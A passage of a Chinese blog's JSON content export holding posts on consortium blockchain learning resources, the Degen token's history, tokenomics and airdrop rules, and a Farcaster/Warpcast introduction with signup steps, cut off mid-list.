等语言编写，不同联盟链框架对合约语言的支持不同，可根据需要进一步学习</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>源码分析</strong><ul>\n<li>《Hyperledger Fabric 源代码分析与深入解读》</li>\n<li>Hyperledger Fabric v2.x 最新资料汇总<a href=\"https://hello2mao.github.io/2020/04/22/hyperledger-fabric-v2.x-info/\">🔗</a></li>\n<li>Fabric2.2 中的 Raft 共识模块源码分析<a href=\"https://www.cnblogs.com/GarrettWale/p/16131853.html\">🔗</a></li>\n<li>深入浅出 FISCO BCOS<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/index.html\">🔗</a></li>\n<li>FISCO BCOS 核心模块设计解析<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/design/index.html\">🔗</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><ul>\n<li><strong>联盟链实例</strong><ul>\n<li>Hyperledger Fabric<ul>\n<li>Hyperledger Fabric 是由 Linux 基金会支持的开源项目，提供了一种可扩展、可定制和安全的联盟链技术。</li>\n<li>官网：<a href=\"https://www.hyperledger.org/use/fabric\">🔗</a></li>\n<li>paper:<a href=\"https://arxiv.org/pdf/1801.10228.pdf\">🔗</a></li>\n<li>官方文档：<a href=\"https://hyperledger-fabric.readthedocs.io/en/release-2.5/\">🔗</a></li>\n<li>中文文档：<a href=\"https://hyperledgercn.github.io/hyperledgerDocs/\">🔗</a></li>\n<li>中文视频 Tutorial：<a href=\"https://wiki.hyperledger.org/display/TWGC/Fabric+Video+Tutorial\">🔗</a></li>\n<li>FAQ：<a href=\"https://github.com/Hyperledger-TWGC/FAQ\">🔗</a></li>\n<li>博客(Hyperledger Fabric 2.0 系列)：<a href=\"https://blog.csdn.net/qq_28540443/article/details/104265844\">🔗</a></li>\n<li>电子书《区块链技术指南》:<a href=\"https://github.com/yeasy/blockchain_guide\">🔗</a></li>\n<li>电子书《Hyperledger 源码分析之 Fabric》:<a href=\"https://github.com/yeasy/hyperledger_code_fabric\">🔗</a></li>\n</ul>\n</li>\n<li>R3 Corda(金融行业)<ul>\n<li>R3 Corda 是一种用于金融行业的联盟链技术，提供了一种可扩展、安全和隐私保护的方法。</li>\n<li>官网：<a href=\"https://r3.com/products/corda/\">🔗</a></li>\n<li>white paper：<a href=\"https://r3.com/blog/corda-technical-whitepaper/\">🔗</a></li>\n<li>官方文档：<a href=\"https://docs.r3.com/\">🔗</a></li>\n<li>中文文档：<a href=\"https://cncorda.readthedocs.io/zh_CN/latest/index.html\">🔗</a></li>\n<li>developer training:<a href=\"https://training.corda.net/\">🔗</a></li>\n<li>FAQ:<a href=\"https://docs.r3.com/en/platform/corda/4.9/enterprise/notary/faq/toctree.html\">🔗</a></li>\n</ul>\n</li>\n<li>FISCO BCOS(国内金链盟)<ul>\n<li>FISCO BCOS 是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于 2017 年正式对外开源。</li>\n<li>官网：<a href=\"https://www.fisco.com.cn/fisco_20.html\">🔗</a></li>\n<li>white paper:<a href=\"https://github.com/FISCO-BCOS/whitepaper\">🔗</a></li>\n<li>中文文档：<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/\">🔗</a></li>\n<li>英文文档：<a href=\"https://fisco-bcos-documentation.readthedocs.io/en/latest/index.html\">🔗</a></li>\n<li>博客：<a href=\"https://www.wanghaoyi.com/fisco-bcos-learning.html\">🔗</a></li>\n<li>FAQ：<a href=\"https://fisco-bcos-documentation.readthedocs.io/en/latest/docs/faq/faq.html\">🔗</a></li>\n</ul>\n</li>\n<li>Quorum(基于以太坊代码库)<ul>\n<li>Quorum 是由美国金融机构摩根大通推出的企业级分布式账本和智能合约平台，可看作企业版的以太坊。它是基于以太坊分布式账本协议开发而成，为金融服务行业提供以太坊许可链方案，以便支持交易与合约的隐私性。</li>\n<li>官网：<a href=\"https://quorum.com/\">🔗</a></li>\n<li>white paper:<a href=\"https://github.com/ConsenSys/quorum/blob/master/docs/Quorum%20Whitepaper%20v0.2.pdf\">🔗</a></li>\n<li>官方 Tutorial：<a href=\"https://docs.goquorum.consensys.net/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>应用实例</strong><ul>\n<li>金融服务：<ul>\n<li>项目：taXchain - A blockchain network to exchange digitized tax forms(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/taxchain-case-study\">🔗</a></li>\n<li>项目：fragmos chain - Digitizing interactions between OTC derivatives market participants(R3 Corda)<a href=\"https://r3.com/case-studies/fragmos-chain/\">🔗</a></li>\n<li>项目：Spunta - Revolutionizing the interbank reconciliation process in Italy(R3 Corda)<a href=\"https://r3.com/case-studies/spunta/\">🔗</a></li>\n<li>项目：广东国税税链项目（蚂蚁链）<a href=\"https://guangdong.chinatax.gov.cn/gdsw/gzsw_swxw/2021-10/08/content_323f08675f604b629f233b5f38707d91.shtml\">🔗</a></li>\n<li>项目：浙江区块链电子票据平台（蚂蚁链）<a href=\"https://www.zjzwfw.gov.cn/col/col1228922696/\">🔗</a></li>\n</ul>\n</li>\n<li>供应链管理：<ul>\n<li>项目：KrypC - Managing the Metal and Mining Industry’s Supply Chain(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/krypc-minehub-case-study\">🔗</a></li>\n<li>项目：gavea - Automating the commodity trading process(R3 Corda)<a href=\"https://r3.com/case-studies/gavea/\">🔗</a></li>\n<li>项目：axedra - Connecting and digitizing the precious metals industry(R3 Corda)<a href=\"https://r3.com/case-studies/axedras/\">🔗</a></li>\n</ul>\n</li>\n<li>电子政务：<ul>\n<li>项目：澳门智慧城市-证书电子化（FISCO BCOS）</li>\n<li>项目：山东省荣成市区块链政务诚信管理系统（FISCO BCOS)</li>\n<li>项目：安徽区块链电子证照应用（蚂蚁链）<a href=\"https://sft.ah.gov.cn/public/7061/53866131.html\">🔗</a></li>\n</ul>\n</li>\n<li>智慧医疗：<ul>\n<li>项目：LedgerDomain - The Right Rx for the Pharmaceutical Supply Chain(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/ledgerdomain-case-study\">🔗</a></li>\n<li>项目：武汉市中心医院&#x2F;上海华山医院-区块链医疗电子处方（蚂蚁链）<a href=\"https://developer.aliyun.com/article/697162\">🔗</a></li>\n</ul>\n</li>\n<li>版权保护：<ul>\n<li>项目：人民版权-区块链版权保护平台（FISCO BCOS）<a href=\"https://www.peoplec.cn/\">🔗</a></li>\n<li>项目：雀凿数字版权服务平台（蚂蚁链）<a href=\"https://www.mydcs.com/pages/index?channelCode=WBLT\">🔗</a></li>\n</ul>\n</li>\n<li>其他：<ul>\n<li>项目：Sony Global Education - a Next-Generation Credentials Platform(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/wp-content/uploads/2017/12/Hyperledger_CaseStudy_Sony.pdf\">🔗</a></li>\n<li>项目：绿色出行普惠平台-绿色碳交易积分区块链（FISCO BCOS)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"05-代币","date":"2024-08-01T16:04:35.000Z","_content":"# Degen代币\n\n## Degen 代币的起源与发展\n\nDegen 代币的历史可以追溯到 2024 年 1 月在 Base 链上的首次推出。从 Farcaster 社区的 /degen 频道开始,Degen 凭借其独特的激励机制和迷因文化,迅速在加密货币社区内掀起了轰动,并为其后续的发展奠定了坚实的基础。\n\n### Degen 的早期发展\n\n-   Farcaster 社区\n    -   Farcaster 作为一个去中心化的社交应用,以其独特的社交互动方式和强调隐私保护而受到关注。在 Farcaster 上,用户可以分享、讨论和互动,同时利用区块链技术保证内容的真实性和不可篡改性。\n-   /degen 频道\n    -   /degen 频道作为 Farcaster 上最早的频道之一,由 Warpcast 团队推出,迅速成为讨论加密货币价格和分享投资经历的热门场所。\n-   Degen 的推出\n    -   2024 年 1 月,Degen 在 Base 链上推出,并通过对 /degen 频道社区成员的空投活动,展现了其独有的激励机制和迷因文化,促进了社区内全新的社交互动方式。\n\n### Degen 的 Tokenomics\n\n-   总供应量\n    -   约 370 亿 DEGEN 代币,其中 70% 分配给社区,15% 分配给流动性池,15% 用于开发团队、早期投资者和生态系统持续改进。\n-   天使轮融资\n    -   2 月 Degen 完成了 490.5 枚 ETH 的天使轮融资,由 1confirmation 领投,Farcaster OG 和其他机构参与。\n-   市值表现\n    -   根据 4.23 CMC 数据,Degen 市值 422M,FDV 1.1B。\n\n### Degen Chain 的推出\n\n-   Degen Chain 的建立\n    -   Degen 的开发团队与 Syndicate 合作,推出了基于 Base 链的 L3 —— Degen Chain。这为 Degen 提供了强大的技术支持和扩展性,同时将其市场估值推向新高。\n-   Degen Chain 的特点\n    -   Degen Chain 由 Degen 社区建立,采用 Arbitrum Orbit 构建,以 Base 链为结算层,并利用 AnyTrust 为数据可用性提供支持。其原生 gas 代币为 DEGEN。\n-   Degen Chain 的应用\n    -   Degen Chain 不仅为支付、游戏等领域的新实验提供了支持,而且通过 Syndicate 提供的开发者工具,为在 Degen Chain 上的开发者提供了免费的 gas,促进了创新应用的开发。\n\n### Degen Chain 的成就\n\n-   交易量\n    -   自平台启动以来,Degen Chain 上的 DegenSwap 交易平台在短短四天内就实现了近 1 亿美元的交易量。\n-   交易数量\n    -   DegenSwap 在短时间内完成了超过 272,000 笔独特交易。\n-   合约数量\n    -   DegenSwap 托管了超过 7,500 个合约和 2,300 个代币。\n-   发展潜力\n    -   Degen Chain 在推动区块链创新和加速社区代币应用方面展现了巨大的潜力。\n\n## degen的打赏文化以及空投\n\ndegen 代币是创建于以太坊2层网络 base 链上的一个去中心化网络 farcaster 上的社区代币。degen更多是用来做打赏使用，你收到多少打赏积分，就可以兑换多少的degen代币空投。\n\n### degen的打赏方式\n\n-   degen空投阶段2\n    -   这是一个链下的方式,使用degen points积分,月末可以将degen积分兑换为degen代币。\n-   第三方机器人或者frame打赏\n    -   比如jeeves 或者paybot,通过这些第三方机器人进行degen代币转账。\n\n### degen空投的条件和流程\n\n-   发帖要求\n    -   至少要发三条帖子,就是要cast三次。\n-   钱包验证\n    -   必须要将warpcast在设置里面验证一个钱包地址,且钱包里面必须至少要有1万个degen代币。\n-   钱包存款\n    -   钱包里面必须至少要有1万个degen代币。\n\n上面3个条件满足之后，至少要过48小时之后，你才能有打赏条件degen 积分可以1比1兑换为degen代币，\n\n在https://degen.tips 这个网站兑换，月末进行兑换，大约会有一个月时间来兑换。\n\n除了链下的degen打赏，还有链上的，主要是通过degen jeeves 以及paybot这两个机器人来打赏。\n\n感兴趣的，可以看这篇文章：https://paragraph.xyz/@houseofdegen/degen-tipping\n\n\n","source":"_posts/BlockChain/Road/05-代币.md","raw":"---\ntitle: 05-代币\ndate: 2024-08-02 00:04:35\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# Degen代币\n\n## Degen 代币的起源与发展\n\nDegen 代币的历史可以追溯到 2024 年 1 月在 Base 链上的首次推出。从 Farcaster 社区的 /degen 频道开始,Degen 凭借其独特的激励机制和迷因文化,迅速在加密货币社区内掀起了轰动,并为其后续的发展奠定了坚实的基础。\n\n### Degen 的早期发展\n\n-   Farcaster 社区\n    -   Farcaster 作为一个去中心化的社交应用,以其独特的社交互动方式和强调隐私保护而受到关注。在 Farcaster 上,用户可以分享、讨论和互动,同时利用区块链技术保证内容的真实性和不可篡改性。\n-   /degen 频道\n    -   /degen 频道作为 Farcaster 上最早的频道之一,由 Warpcast 团队推出,迅速成为讨论加密货币价格和分享投资经历的热门场所。\n-   Degen 的推出\n    -   2024 年 1 月,Degen 在 Base 链上推出,并通过对 /degen 频道社区成员的空投活动,展现了其独有的激励机制和迷因文化,促进了社区内全新的社交互动方式。\n\n### Degen 的 Tokenomics\n\n-   总供应量\n    -   约 370 亿 DEGEN 代币,其中 70% 分配给社区,15% 分配给流动性池,15% 用于开发团队、早期投资者和生态系统持续改进。\n-   天使轮融资\n    -   2 月 Degen 完成了 490.5 枚 ETH 的天使轮融资,由 1confirmation 领投,Farcaster OG 和其他机构参与。\n-   市值表现\n    -   根据 4.23 CMC 数据,Degen 市值 422M,FDV 1.1B。\n\n### Degen Chain 的推出\n\n-   Degen Chain 的建立\n    -   Degen 的开发团队与 Syndicate 合作,推出了基于 Base 链的 L3 —— Degen Chain。这为 Degen 提供了强大的技术支持和扩展性,同时将其市场估值推向新高。\n-   Degen Chain 的特点\n    -   Degen Chain 由 Degen 社区建立,采用 Arbitrum Orbit 构建,以 Base 链为结算层,并利用 AnyTrust 为数据可用性提供支持。其原生 gas 代币为 DEGEN。\n-   Degen Chain 的应用\n    -   Degen Chain 不仅为支付、游戏等领域的新实验提供了支持,而且通过 Syndicate 提供的开发者工具,为在 Degen Chain 上的开发者提供了免费的 gas,促进了创新应用的开发。\n\n### Degen Chain 的成就\n\n-   交易量\n    -   自平台启动以来,Degen Chain 上的 DegenSwap 交易平台在短短四天内就实现了近 1 亿美元的交易量。\n-   交易数量\n    -   DegenSwap 在短时间内完成了超过 272,000 笔独特交易。\n-   合约数量\n    -   DegenSwap 托管了超过 7,500 个合约和 2,300 个代币。\n-   发展潜力\n    -   Degen Chain 在推动区块链创新和加速社区代币应用方面展现了巨大的潜力。\n\n## degen的打赏文化以及空投\n\ndegen 代币是创建于以太坊2层网络 base 链上的一个去中心化网络 farcaster 上的社区代币。degen更多是用来做打赏使用，你收到多少打赏积分，就可以兑换多少的degen代币空投。\n\n### degen的打赏方式\n\n-   degen空投阶段2\n    -   这是一个链下的方式,使用degen points积分,月末可以将degen积分兑换为degen代币。\n-   第三方机器人或者frame打赏\n    -   比如jeeves 或者paybot,通过这些第三方机器人进行degen代币转账。\n\n### degen空投的条件和流程\n\n-   发帖要求\n    -   至少要发三条帖子,就是要cast三次。\n-   钱包验证\n    -   必须要将warpcast在设置里面验证一个钱包地址,且钱包里面必须至少要有1万个degen代币。\n-   钱包存款\n    -   钱包里面必须至少要有1万个degen代币。\n\n上面3个条件满足之后，至少要过48小时之后，你才能有打赏条件degen 积分可以1比1兑换为degen代币，\n\n在https://degen.tips 这个网站兑换，月末进行兑换，大约会有一个月时间来兑换。\n\n除了链下的degen打赏，还有链上的，主要是通过degen jeeves 以及paybot这两个机器人来打赏。\n\n感兴趣的，可以看这篇文章：https://paragraph.xyz/@houseofdegen/degen-tipping\n\n\n","slug":"BlockChain/Road/05-代币","published":1,"updated":"2024-08-01T16:11:46.282Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821m000a2sunffek0ri9","content":"<h1 id=\"Degen代币\"><a href=\"#Degen代币\" class=\"headerlink\" title=\"Degen代币\"></a>Degen代币</h1><h2 id=\"Degen-代币的起源与发展\"><a href=\"#Degen-代币的起源与发展\" class=\"headerlink\" title=\"Degen 代币的起源与发展\"></a>Degen 代币的起源与发展</h2><p>Degen 代币的历史可以追溯到 2024 年 1 月在 Base 链上的首次推出。从 Farcaster 社区的 &#x2F;degen 频道开始,Degen 凭借其独特的激励机制和迷因文化,迅速在加密货币社区内掀起了轰动,并为其后续的发展奠定了坚实的基础。</p>\n<h3 id=\"Degen-的早期发展\"><a href=\"#Degen-的早期发展\" class=\"headerlink\" title=\"Degen 的早期发展\"></a>Degen 的早期发展</h3><ul>\n<li>Farcaster 社区<ul>\n<li>Farcaster 作为一个去中心化的社交应用,以其独特的社交互动方式和强调隐私保护而受到关注。在 Farcaster 上,用户可以分享、讨论和互动,同时利用区块链技术保证内容的真实性和不可篡改性。</li>\n</ul>\n</li>\n<li>&#x2F;degen 频道<ul>\n<li>&#x2F;degen 频道作为 Farcaster 上最早的频道之一,由 Warpcast 团队推出,迅速成为讨论加密货币价格和分享投资经历的热门场所。</li>\n</ul>\n</li>\n<li>Degen 的推出<ul>\n<li>2024 年 1 月,Degen 在 Base 链上推出,并通过对 &#x2F;degen 频道社区成员的空投活动,展现了其独有的激励机制和迷因文化,促进了社区内全新的社交互动方式。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-的-Tokenomics\"><a href=\"#Degen-的-Tokenomics\" class=\"headerlink\" title=\"Degen 的 Tokenomics\"></a>Degen 的 Tokenomics</h3><ul>\n<li>总供应量<ul>\n<li>约 370 亿 DEGEN 代币,其中 70% 分配给社区,15% 分配给流动性池,15% 用于开发团队、早期投资者和生态系统持续改进。</li>\n</ul>\n</li>\n<li>天使轮融资<ul>\n<li>2 月 Degen 完成了 490.5 枚 ETH 的天使轮融资,由 1confirmation 领投,Farcaster OG 和其他机构参与。</li>\n</ul>\n</li>\n<li>市值表现<ul>\n<li>根据 4.23 CMC 数据,Degen 市值 422M,FDV 1.1B。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-Chain-的推出\"><a href=\"#Degen-Chain-的推出\" class=\"headerlink\" title=\"Degen Chain 的推出\"></a>Degen Chain 的推出</h3><ul>\n<li>Degen Chain 的建立<ul>\n<li>Degen 的开发团队与 Syndicate 合作,推出了基于 Base 链的 L3 —— Degen Chain。这为 Degen 提供了强大的技术支持和扩展性,同时将其市场估值推向新高。</li>\n</ul>\n</li>\n<li>Degen Chain 的特点<ul>\n<li>Degen Chain 由 Degen 社区建立,采用 Arbitrum Orbit 构建,以 Base 链为结算层,并利用 AnyTrust 为数据可用性提供支持。其原生 gas 代币为 DEGEN。</li>\n</ul>\n</li>\n<li>Degen Chain 的应用<ul>\n<li>Degen Chain 不仅为支付、游戏等领域的新实验提供了支持,而且通过 Syndicate 提供的开发者工具,为在 Degen Chain 上的开发者提供了免费的 gas,促进了创新应用的开发。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-Chain-的成就\"><a href=\"#Degen-Chain-的成就\" class=\"headerlink\" title=\"Degen Chain 的成就\"></a>Degen Chain 的成就</h3><ul>\n<li>交易量<ul>\n<li>自平台启动以来,Degen Chain 上的 DegenSwap 交易平台在短短四天内就实现了近 1 亿美元的交易量。</li>\n</ul>\n</li>\n<li>交易数量<ul>\n<li>DegenSwap 在短时间内完成了超过 272,000 笔独特交易。</li>\n</ul>\n</li>\n<li>合约数量<ul>\n<li>DegenSwap 托管了超过 7,500 个合约和 2,300 个代币。</li>\n</ul>\n</li>\n<li>发展潜力<ul>\n<li>Degen Chain 在推动区块链创新和加速社区代币应用方面展现了巨大的潜力。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"degen的打赏文化以及空投\"><a href=\"#degen的打赏文化以及空投\" class=\"headerlink\" title=\"degen的打赏文化以及空投\"></a>degen的打赏文化以及空投</h2><p>degen 代币是创建于以太坊2层网络 base 链上的一个去中心化网络 farcaster 上的社区代币。degen更多是用来做打赏使用，你收到多少打赏积分，就可以兑换多少的degen代币空投。</p>\n<h3 id=\"degen的打赏方式\"><a href=\"#degen的打赏方式\" class=\"headerlink\" title=\"degen的打赏方式\"></a>degen的打赏方式</h3><ul>\n<li>degen空投阶段2<ul>\n<li>这是一个链下的方式,使用degen points积分,月末可以将degen积分兑换为degen代币。</li>\n</ul>\n</li>\n<li>第三方机器人或者frame打赏<ul>\n<li>比如jeeves 或者paybot,通过这些第三方机器人进行degen代币转账。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"degen空投的条件和流程\"><a href=\"#degen空投的条件和流程\" class=\"headerlink\" title=\"degen空投的条件和流程\"></a>degen空投的条件和流程</h3><ul>\n<li>发帖要求<ul>\n<li>至少要发三条帖子,就是要cast三次。</li>\n</ul>\n</li>\n<li>钱包验证<ul>\n<li>必须要将warpcast在设置里面验证一个钱包地址,且钱包里面必须至少要有1万个degen代币。</li>\n</ul>\n</li>\n<li>钱包存款<ul>\n<li>钱包里面必须至少要有1万个degen代币。</li>\n</ul>\n</li>\n</ul>\n<p>上面3个条件满足之后，至少要过48小时之后，你才能有打赏条件degen 积分可以1比1兑换为degen代币，</p>\n<p>在<a href=\"https://degen.tips/\">https://degen.tips</a> 这个网站兑换，月末进行兑换，大约会有一个月时间来兑换。</p>\n<p>除了链下的degen打赏，还有链上的，主要是通过degen jeeves 以及paybot这两个机器人来打赏。</p>\n<p>感兴趣的，可以看这篇文章：<a href=\"https://paragraph.xyz/@houseofdegen/degen-tipping\">https://paragraph.xyz/@houseofdegen/degen-tipping</a></p>\n","excerpt":"","more":"<h1 id=\"Degen代币\"><a href=\"#Degen代币\" class=\"headerlink\" title=\"Degen代币\"></a>Degen代币</h1><h2 id=\"Degen-代币的起源与发展\"><a href=\"#Degen-代币的起源与发展\" class=\"headerlink\" title=\"Degen 代币的起源与发展\"></a>Degen 代币的起源与发展</h2><p>Degen 代币的历史可以追溯到 2024 年 1 月在 Base 链上的首次推出。从 Farcaster 社区的 &#x2F;degen 频道开始,Degen 凭借其独特的激励机制和迷因文化,迅速在加密货币社区内掀起了轰动,并为其后续的发展奠定了坚实的基础。</p>\n<h3 id=\"Degen-的早期发展\"><a href=\"#Degen-的早期发展\" class=\"headerlink\" title=\"Degen 的早期发展\"></a>Degen 的早期发展</h3><ul>\n<li>Farcaster 社区<ul>\n<li>Farcaster 作为一个去中心化的社交应用,以其独特的社交互动方式和强调隐私保护而受到关注。在 Farcaster 上,用户可以分享、讨论和互动,同时利用区块链技术保证内容的真实性和不可篡改性。</li>\n</ul>\n</li>\n<li>&#x2F;degen 频道<ul>\n<li>&#x2F;degen 频道作为 Farcaster 上最早的频道之一,由 Warpcast 团队推出,迅速成为讨论加密货币价格和分享投资经历的热门场所。</li>\n</ul>\n</li>\n<li>Degen 的推出<ul>\n<li>2024 年 1 月,Degen 在 Base 链上推出,并通过对 &#x2F;degen 频道社区成员的空投活动,展现了其独有的激励机制和迷因文化,促进了社区内全新的社交互动方式。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-的-Tokenomics\"><a href=\"#Degen-的-Tokenomics\" class=\"headerlink\" title=\"Degen 的 Tokenomics\"></a>Degen 的 Tokenomics</h3><ul>\n<li>总供应量<ul>\n<li>约 370 亿 DEGEN 代币,其中 70% 分配给社区,15% 分配给流动性池,15% 用于开发团队、早期投资者和生态系统持续改进。</li>\n</ul>\n</li>\n<li>天使轮融资<ul>\n<li>2 月 Degen 完成了 490.5 枚 ETH 的天使轮融资,由 1confirmation 领投,Farcaster OG 和其他机构参与。</li>\n</ul>\n</li>\n<li>市值表现<ul>\n<li>根据 4.23 CMC 数据,Degen 市值 422M,FDV 1.1B。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-Chain-的推出\"><a href=\"#Degen-Chain-的推出\" class=\"headerlink\" title=\"Degen Chain 的推出\"></a>Degen Chain 的推出</h3><ul>\n<li>Degen Chain 的建立<ul>\n<li>Degen 的开发团队与 Syndicate 合作,推出了基于 Base 链的 L3 —— Degen Chain。这为 Degen 提供了强大的技术支持和扩展性,同时将其市场估值推向新高。</li>\n</ul>\n</li>\n<li>Degen Chain 的特点<ul>\n<li>Degen Chain 由 Degen 社区建立,采用 Arbitrum Orbit 构建,以 Base 链为结算层,并利用 AnyTrust 为数据可用性提供支持。其原生 gas 代币为 DEGEN。</li>\n</ul>\n</li>\n<li>Degen Chain 的应用<ul>\n<li>Degen Chain 不仅为支付、游戏等领域的新实验提供了支持,而且通过 Syndicate 提供的开发者工具,为在 Degen Chain 上的开发者提供了免费的 gas,促进了创新应用的开发。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Degen-Chain-的成就\"><a href=\"#Degen-Chain-的成就\" class=\"headerlink\" title=\"Degen Chain 的成就\"></a>Degen Chain 的成就</h3><ul>\n<li>交易量<ul>\n<li>自平台启动以来,Degen Chain 上的 DegenSwap 交易平台在短短四天内就实现了近 1 亿美元的交易量。</li>\n</ul>\n</li>\n<li>交易数量<ul>\n<li>DegenSwap 在短时间内完成了超过 272,000 笔独特交易。</li>\n</ul>\n</li>\n<li>合约数量<ul>\n<li>DegenSwap 托管了超过 7,500 个合约和 2,300 个代币。</li>\n</ul>\n</li>\n<li>发展潜力<ul>\n<li>Degen Chain 在推动区块链创新和加速社区代币应用方面展现了巨大的潜力。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"degen的打赏文化以及空投\"><a href=\"#degen的打赏文化以及空投\" class=\"headerlink\" title=\"degen的打赏文化以及空投\"></a>degen的打赏文化以及空投</h2><p>degen 代币是创建于以太坊2层网络 base 链上的一个去中心化网络 farcaster 上的社区代币。degen更多是用来做打赏使用，你收到多少打赏积分，就可以兑换多少的degen代币空投。</p>\n<h3 id=\"degen的打赏方式\"><a href=\"#degen的打赏方式\" class=\"headerlink\" title=\"degen的打赏方式\"></a>degen的打赏方式</h3><ul>\n<li>degen空投阶段2<ul>\n<li>这是一个链下的方式,使用degen points积分,月末可以将degen积分兑换为degen代币。</li>\n</ul>\n</li>\n<li>第三方机器人或者frame打赏<ul>\n<li>比如jeeves 或者paybot,通过这些第三方机器人进行degen代币转账。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"degen空投的条件和流程\"><a href=\"#degen空投的条件和流程\" class=\"headerlink\" title=\"degen空投的条件和流程\"></a>degen空投的条件和流程</h3><ul>\n<li>发帖要求<ul>\n<li>至少要发三条帖子,就是要cast三次。</li>\n</ul>\n</li>\n<li>钱包验证<ul>\n<li>必须要将warpcast在设置里面验证一个钱包地址,且钱包里面必须至少要有1万个degen代币。</li>\n</ul>\n</li>\n<li>钱包存款<ul>\n<li>钱包里面必须至少要有1万个degen代币。</li>\n</ul>\n</li>\n</ul>\n<p>上面3个条件满足之后，至少要过48小时之后，你才能有打赏条件degen 积分可以1比1兑换为degen代币，</p>\n<p>在<a href=\"https://degen.tips/\">https://degen.tips</a> 这个网站兑换，月末进行兑换，大约会有一个月时间来兑换。</p>\n<p>除了链下的degen打赏，还有链上的，主要是通过degen jeeves 以及paybot这两个机器人来打赏。</p>\n<p>感兴趣的，可以看这篇文章：<a href=\"https://paragraph.xyz/@houseofdegen/degen-tipping\">https://paragraph.xyz/@houseofdegen/degen-tipping</a></p>\n"},{"title":"06-Farcaster社交协议","date":"2024-08-01T16:05:13.000Z","_content":"# Farcaster 社交协议\n\n## 简介\n\nFarcaster是一个社交协议，作为一个开源的社交关系图谱，支持开发者在这个协议上构建各种应用，其地位可以看作是Base生态的核心，现在的Base链项目的一手消息都是Farcaster上面的。\n\nWarpcast是支持这个协议的一个客户端，也是大家最常的一个，简单理解就是一个社交APP，类比推特\n\n## 投资背景\n\n2022 年 7 月 13 日，Farcaster 完成 3000 万美元融资，a16z 领投\n\n![image-20240512233007556](./img/image-20240512233007556.png)\n\n## 增长与社区\n\nFarcaster最早是一些VC、项目方在玩，比较小众，类似知乎早期的精英模式，如V神就是重度用户，并对Farcaster给予了高度评价。btw，base chain创始人Jesse也在上面活跃。\n\n尽管起步较慢，Farcaster通过其特色功能“**Frame**”在短时间内实现了用户数量的显著增长，日活跃用户从6000人增长到6万人。\n\n## Frame功能\n\nFarcaster的一个独特功能是“Frame”，它允许开发者使用API和库来开发一些有趣的功能。这种功能可以嵌入到帖子中，类似于小程序，可以调用所有链的dapp(主要是base、zora),极大地增强了帖子的互动性和功能性。\n\ne.g 你可以在帖子中直接铸造base nft\n\n![image-20240512233135377](./img/image-20240512233135377.png)\n\n## Warpcast玩法\n\n玩法流程：\n\n1. Google Store/ 国外苹果id，用来下载warpcast\n\n2. 一个绑定了可以付款外币信用卡的苹果账户（可国内账户） / Google Store账户，因为需要支付5美金\n\n3. 点击邀请链接，输入邮箱 https://warpcast.com/~/invite-page/399977?id=fdf16c3d\n\n4. 注册好之后，记得保存助记词\n\n5. 登陆网页端（用手机扫码登陆）https://warpcast.com/\n\n6. 去网页端绑定evm钱包\n\n7. 关注名人账号，优化信息流\n\n    @jessepollak base创始人\n\n    @vitalik.eth v神\n\n    ...\n\n    @arespollo pollo 把我关注的都关注一下，顺带也关注我lol\n\n8. 名词科普\n\n    Cast ：一条帖子，理解成推特的一条推文\n\n    Channel ：频道，类似豆瓣的小组，如degen channel\n\n    Warps ：没上链的货币，类比q币，没有价值，主要用途是用来奖励别人、购买空间、租频道\n","source":"_posts/BlockChain/Road/06-Farcaster社交协议.md","raw":"---\ntitle: 06-Farcaster社交协议\ndate: 2024-08-02 00:05:13\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# Farcaster 社交协议\n\n## 简介\n\nFarcaster是一个社交协议，作为一个开源的社交关系图谱，支持开发者在这个协议上构建各种应用，其地位可以看作是Base生态的核心，现在的Base链项目的一手消息都是Farcaster上面的。\n\nWarpcast是支持这个协议的一个客户端，也是大家最常的一个，简单理解就是一个社交APP，类比推特\n\n## 投资背景\n\n2022 年 7 月 13 日，Farcaster 完成 3000 万美元融资，a16z 领投\n\n![image-20240512233007556](./img/image-20240512233007556.png)\n\n## 增长与社区\n\nFarcaster最早是一些VC、项目方在玩，比较小众，类似知乎早期的精英模式，如V神就是重度用户，并对Farcaster给予了高度评价。btw，base chain创始人Jesse也在上面活跃。\n\n尽管起步较慢，Farcaster通过其特色功能“**Frame**”在短时间内实现了用户数量的显著增长，日活跃用户从6000人增长到6万人。\n\n## Frame功能\n\nFarcaster的一个独特功能是“Frame”，它允许开发者使用API和库来开发一些有趣的功能。这种功能可以嵌入到帖子中，类似于小程序，可以调用所有链的dapp(主要是base、zora),极大地增强了帖子的互动性和功能性。\n\ne.g 你可以在帖子中直接铸造base nft\n\n![image-20240512233135377](./img/image-20240512233135377.png)\n\n## Warpcast玩法\n\n玩法流程：\n\n1. Google Store/ 国外苹果id，用来下载warpcast\n\n2. 一个绑定了可以付款外币信用卡的苹果账户（可国内账户） / Google Store账户，因为需要支付5美金\n\n3. 点击邀请链接，输入邮箱 https://warpcast.com/~/invite-page/399977?id=fdf16c3d\n\n4. 